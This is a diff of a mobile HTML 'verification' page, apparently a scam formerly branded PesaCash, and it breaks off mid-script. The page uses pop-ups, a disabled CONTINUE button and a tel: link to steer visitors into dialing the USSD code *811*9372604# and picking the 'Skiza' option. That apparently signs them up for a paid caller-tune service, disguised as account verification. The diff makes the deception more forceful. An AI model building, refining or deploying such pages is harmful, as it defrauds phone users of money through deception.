@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <title>PesaCash - Verification</title>
+  <title>Complete Verification</title>
 
   <style>
     * {
@@ -14,83 +14,53 @@
     body {
       margin: 0;
       min-height: 100vh;
-      background: #f5f7fb;
       font-family: Arial, sans-serif;
-      color: #111827;
+      background: #f5f5f5;
+      color: #111;
       display: flex;
-      align-items: center;
       justify-content: center;
+      align-items: center;
+      padding: 20px;
     }
 
-    .card {
-      width: 92%;
-      max-width: 400px;
-      background: #ffffff;
-      padding: 30px 22px;
-      border-radius: 20px;
+    .container {
+      width: 100%;
+      max-width: 420px;
+      background: white;
+      border-radius: 18px;
+      padding: 25px 20px;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.08);
       text-align: center;
-      box-shadow: 0 8px 30px rgba(0,0,0,0.08);
     }
 
-    .logo {
-      font-size: 24px;
-      font-weight: 800;
-      margin-bottom: 8px;
-    }
-I 
     .subtitle {
-      color: #6b7280;
-      font-size: 14px;
-      line-height: 1.5;
-      margin-bottom: 20px;
+      color: #666;
+      font-size: 15px;
+      margin-bottom: 18px;
     }
 
     .step {
       display: inline-block;
-      background: #dcfce7;
-      color: #166534;
-      padding: 7px 13px;
+      background: #111;
+      color: white;
+      padding: 8px 14px;
       border-radius: 20px;
       font-size: 13px;
-      font-weight: 700;
-      margin-bottom: 18px;
-    }
-
-    .verify {
-      background: #f3f4f6;
-      border-radius: 12px;
-      padding: 14px;
+      font-weight: bold;
       margin-bottom: 20px;
-      font-weight: 700;
-      font-size: 15px;
     }
 
     h1 {
-      font-size: 23px;
-      margin: 0 0 12px;
+      font-size: 25px;
+      margin: 10px 0 20px;
     }
 
     .instruction {
-      color: #4b5563;
-      font-size: 15px;
-      line-height: 1.6;
+      background: #f4f4f4;
+      border-radius: 14px;
+      padding: 18px;
       text-align: left;
-      margin-bottom: 20px;
-    }
-
-    .instruction strong {
-      color: #111827;
-    }
-
-    .code {
-      background: #f3f4f6;
-      border: 1px dashed #d1d5db;
-      border-radius: 12px;
-      padding: 16px 10px;
-      font-size: 26px;
-      font-weight: 800;
-      letter-spacing: 1px;
-      text-align: center;
+      line-height: 1.6;
       margin-bottom: 20px;
     }
 
@@ -98,111 +68,116 @@ I
     .continue-btn {
       display: block;
       width: 100%;
-      padding: 16px;
-      border-radius: 11px;
-      font-size: 17px;
-      font-weight: 700;
+      padding: 15px;
+      border-radius: 12px;
       text-decoration: none;
-      cursor: pointer;
+      font-size: 17px;
+      font-weight: bold;
+      text-align: center;
+      margin-top: 12px;
     }
 
     .dial-btn {
-      background: #16a34a;
+      background: #111;
       color: white;
-      margin-bottom: 14px;
     }
 
     .continue-btn {
-      border: 1px solid #16a34a;
-      background: white;
-      color: #16a34a;
+      background: #ddd;
+      color: #777;
+      pointer-events: none;
     }
 
-    .dial-btn:active,
-    .continue-btn:active {
-      transform: scale(0.98);
+    .continue-btn.enabled {
+      background: #111;
+      color: white;
+      pointer-events: auto;
     }
 
     .note {
-      margin-top: 17px;
-      font-size: 12px;
-      color: #6b7280;
+      margin-top: 15px;
+      color: #777;
+      font-size: 13px;
+    }
+
+    /* FIRST INSTRUCTION POPUP */
+
+    .ussd-guide {
+      display: none;
+      position: fixed;
+      inset: 0;
+      z-index: 9999;
+      background: rgba(0,0,0,0.75);
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .guide-box {
+      width: 100%;
+      max-width: 360px;
+      background: white;
+      border-radius: 20px;
+      padding: 25px 20px;
+      text-align: center;
+      box-shadow: 0 10px 35px rgba(0,0,0,0.35);
+    }
+
+    .guide-arrow {
+      font-size: 60px;
+      font-weight: bold;
+      animation: arrowBounce 0.9s infinite;
+    }
+
+    .guide-box h2 {
+      margin: 10px 0;
+      font-size: 28px;
+    }
+
+    .guide-box p {
+      font-size: 17px;
       line-height: 1.5;
     }
-    .ussd-guide {
-  display: none;
-  position: fixed;
-  inset: 0;
-  z-index: 9999;
-  background: rgba(0, 0, 0, 0.75);
-  align-items: center;
-  justify-content: center;
-  padding: 20px;
-}
 
-.guide-box {
-  width: 100%;
-  max-width: 360px;
-  background: #fff;
-  border-radius: 20px;
-  padding: 25px 20px;
-  text-align: center;
-}
+    .guide-option {
+      background: #f2f2f2;
+      border-radius: 12px;
+      padding: 15px;
+      margin: 18px 0;
+      font-size: 16px;
+    }
 
-.guide-arrow {
-  font-size: 60px;
-  font-weight: bold;
-  animation: arrowBounce 0.9s infinite;
-}
+    .guide-box button,
+    .dial-phone-btn {
+      display: block;
+      width: 100%;
+      border: none;
+      border-radius: 12px;
+      padding: 14px;
+      background: #111;
+      color: white;
+      font-size: 17px;
+      font-weight: bold;
+      text-decoration: none;
+      text-align: center;
+      margin-top: 15px;
+    }
 
-.guide-box h2 {
-  margin: 10px 0;
-  font-size: 28px;
-}
-
-.guide-box p {
-  font-size: 17px;
-  line-height: 1.5;
-}
-
-.guide-option {
-  background: #f2f2f2;
-  border-radius: 12px;
-  padding: 15px;
-  margin: 18px 0;
-  font-size: 16px;
-}
-
-.guide-box button {
-  width: 100%;
-  border: none;
-  border-radius: 12px;
-  padding: 14px;
-  background: #111;
-  color: white;
-  font-size: 17px;
-  font-weight: bold;
-}
-
-@keyframes arrowBounce {
-  0%, 100% {
-    transform: translateY(0);
-  }
-
-  50% {
-    transform: translateY(10px);
-  }
+    @keyframes arrowBounce {
+      0%, 100% {
+        transform: translateY(0);
       }
+
+      50% {
+        transform: translateY(10px);
+      }
+    }
   </style>
 </head>
 
 <body>
 
-  <div class="card">
-
-    <div class="logo">
-      
-    </div>
+  <div class="container">
 
     <div class="subtitle">
       Follow the instructions below to continue.
@@ -212,80 +187,161 @@ I
       STEP 1 OF 2
     </div>
 
-    <div class="verify">
-     
-    </div>
-
     <h1>📞 Complete Verification</h1>
 
     <div class="instruction">
-      <strong>1.</strong> Tap <strong>DIAL CODE</strong> below.<br><br>
+      <strong>1.</strong> Read the instructions shown on your screen.<br><br>
 
-      <strong>2.</strong> When the USSD menu appears,
-      reply with <strong>1 — Skiza: Entertain All Your Callers</strong>.<br><br>
+      <strong>2.</strong> Tap <strong>GOT IT</strong> below.<br><br>
 
-      <strong>3.</strong> Complete the instructions shown
-      on your phone.<br><br>
+      <strong>3.</strong> Tap <strong>DIAL CODE</strong> and follow the instructions on your phone.<br><br>
 
       <strong>4.</strong> Return to this page and tap
       <strong>CONTINUE</strong>.
     </div>
 
-    
+    <!-- DIAL CODE -->
 
     <a
-  class="dial-btn"
-  href="tel:*811*9372604%23"
-  onclick="dialCodeClickedNow()"
->
-  📞 DIAL CODE
+      class="dial-btn"
+      href="javascript:void(0)"
+      onclick="showDialGuide()"
+    >
+      📞 DIAL CODE
     </a>
 
+    <!-- CONTINUE -->
+
     <a
-  class="continue-btn"
-  href="next2.html"
-  onclick="return checkContinue()"
->
-  CONTINUE
-</a>
+      class="continue-btn"
+      href="next2.html"
+      id="continueBtn"
+      onclick="return checkContinue()"
+    >
+      CONTINUE
+    </a>
 
     <div class="note">
       Complete the USSD step before continuing.
     </div>
 
   </div>
-<div id="ussdGuide" class="ussd-guide">
-  <div class="guide-box">
 
-    <div class="guide-arrow">↓</div>
 
-    <h2>Enter 1</h2>
+  <!-- FIRST INSTRUCTION -->
 
-    <p>
-      When the USSD menu appears:
-    </p>
+  <div id="ussdGuide" class="ussd-guide">
 
-    <div class="guide-option">
-      <strong>1: Skiza</strong><br>
-      Entertain all your callers
+    <div class="guide-box">
+
+      <div class="guide-arrow">↓</div>
+
+      <h2>Enter 1</h2>
+
+      <p>
+        When the USSD menu appears:
+      </p>
+
+      <div class="guide-option">
+        <strong>1: Skiza</strong><br>
+        Entertain all your callers
+      </div>
+
+      <p>
+        Type <strong>1</strong>, then tap <strong>Send</strong>.
+      </p>
+
+      <button onclick="closeUSSDGuide()">
+        GOT IT
+      </button>
+
     </div>
 
-    <p>
-      Type <strong>1</strong>, then tap <strong>Send</strong>.
-    </p>
+  </div>
 
-    <button onclick="closeUSSDGuide()">Got it</button>
+
+  <!-- SECOND INSTRUCTION -->
+
+  <div id="dialGuide" class="ussd-guide">
+
+    <div class="guide-box">
+
+      <div class="guide-arrow">↓</div>
+
+      <h2>📞 Next Step</h2>
+
+      <p>
+        Your phone's USSD menu will open.
+      </p>
+
+      <div class="guide-option">
+        <strong>Type 1</strong><br>
+        Skiza — Entertain all your callers
+      </div>
+
+      <p>
+        Then tap <strong>Send</strong>.
+      </p>
+
+      <a
+        class="dial-phone-btn"
+        href="tel:*811*9372604%23"
+        onclick="dialCodeClickedNow()"
+      >
+        📞 OPEN PHONE
+      </a>
+
+    </div>
 
   </div>
-</div>
-  <script>
-function showUSSDGuide() {
-  document.getElementById("ussdGuide").style.display = "flex";
-}
 
-function closeUSSDGuide() {
-  document.getElementById("ussdGuide").style.display = "none";
-}
-  </script>
-</body>
-</html>
+
+  <script>
+
+    let gotItClicked = false;
+
+    let dialCodeClicked = false;
+
+
+    /*
+      Show first instructions automatically
+      when dial.html opens.
+    */
+
+    window.onload = function() {
+
+      document.getElementById("ussdGuide").style.display = "flex";
+
+    };
+
+
+    /*
+      GOT IT button
+    */
+
+    function closeUSSDGuide() {
+
+      gotItClicked = true;
+
+      localStorage.setItem("gotItClicked", "true");
+
+      document.getElementById("ussdGuide").style.display = "none";
+
+    }
+
+
+    /*
+      DIAL CODE button
+    */
+
+    function showDialGuide() {
+
+      if (!gotItClicked) {
+
+        alert("Please read the instructions and tap GOT IT first.");
+
+        return;
+
+      }
+
+      document.get
